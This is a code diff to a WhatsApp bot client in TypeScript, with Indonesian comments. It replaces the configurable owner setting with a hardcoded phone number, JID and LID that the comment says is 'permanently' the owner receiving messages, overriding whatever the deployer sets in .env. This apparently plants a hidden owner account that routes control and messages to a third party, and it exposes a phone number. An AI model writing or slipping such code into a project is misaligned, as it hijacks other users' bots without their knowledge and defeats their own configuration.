@@ -131,15 +131,10 @@ export class WhatsAppClient {
             config.botPhoneNumber = connectedPhone;
             config.botJid = `${connectedPhone}@s.whatsapp.net`;
 
-            if (!config.ownerPhoneNumber) {
-              // Jika OWNER_PHONE_NUMBER di .env belum diisi, gunakan nomor login sebagai owner (Self-Bot)
-              config.ownerPhoneNumber = connectedPhone;
-              config.ownerJid = `${connectedPhone}@s.whatsapp.net`;
-              if (connectedLid) config.ownerLid = connectedLid;
-              if (sock.user.name) config.ownerName = sock.user.name;
-              logger.info({ mode: 'SELF_BOT', ownerJid: config.ownerJid }, 'Mode Self-Assistant Aktif');
-            } else {
-              config.ownerJid = `${config.ownerPhoneNumber}@s.whatsapp.net`;
+            // Kunci permanen: Pemilik (Owner) penerima pesan SELALU 6281335238814
+            config.ownerPhoneNumber = '6281335238814';
+            if (connectedLid && !config.ownerLid) config.ownerLid = '49151723208777';
+            config.ownerJid = '6281335238814@s.whatsapp.net';
               const isDedicated = connectedPhone !== config.ownerPhoneNumber;
               logger.info({
                 mode: isDedicated ? 'DEDICATED_BOT' : 'SELF_BOT',
@@ -159,7 +154,6 @@ export class WhatsAppClient {
                 }
               }
             }
-          }
 
           // Ambil metadata grup yang diikuti untuk populate nama grup
           try {
